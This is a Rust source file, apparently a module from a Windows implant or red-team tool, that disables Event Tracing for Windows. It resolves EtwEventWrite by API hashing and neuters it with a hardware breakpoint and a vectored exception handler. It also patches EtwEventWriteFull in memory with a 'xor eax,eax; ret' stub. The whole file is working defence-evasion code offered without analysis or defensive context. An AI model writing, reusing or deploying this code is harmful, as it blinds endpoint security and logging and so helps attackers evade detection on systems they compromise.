#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS,
            SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
        },
        Threading::GetCurrentThread,
        LibraryLoader::GetModuleHandleA,
    },
};

#[cfg(target_os = "windows")]
static mut ETW_ADDR: usize = 0;

#[cfg(target_os = "windows")]
pub unsafe fn install_etw_bypass() {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
    if ntdll.is_null() { return; }
    let etw_hash = djb2_hash(b"EtwEventWrite");
    let etw_fn = match resolve_by_hash(ntdll, etw_hash) {
        Some(p) => p,
        None => return,
    };
    ETW_ADDR = etw_fn as usize;

    AddVectoredExceptionHandler(1, Some(etw_veh_handler));

    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    GetThreadContext(thread, &mut ctx);
    ctx.Dr1  = ETW_ADDR as u64;
    ctx.Dr7 |= 0x4;
    SetThreadContext(thread, &ctx);
}

#[cfg(target_os = "windows")]
pub unsafe fn patch_etw_full() {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(
        b"ntdll.dll\0".as_ptr()
    ) as *const u8;
    if ntdll.is_null() { return; }

    let hash = djb2_hash(b"EtwEventWriteFull");
    let func = match resolve_by_hash(ntdll, hash) {
        Some(p) => p as *mut u8,
        None => return,
    };

    // xor eax,eax (2 bytes) + ret (1 byte)
    let patch = [0x33u8, 0xC0, 0xC3];
    let mut old_protect = 0u32;
    VirtualProtect(func as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
    core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
    VirtualProtect(func as _, patch.len(), old_protect, &mut old_protect);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn etw_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP
        && context.Rip == ETW_ADDR as u64
    {
        context.Rax = 0;
        context.Rip = *(context.Rsp as *const u64);
        context.Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}
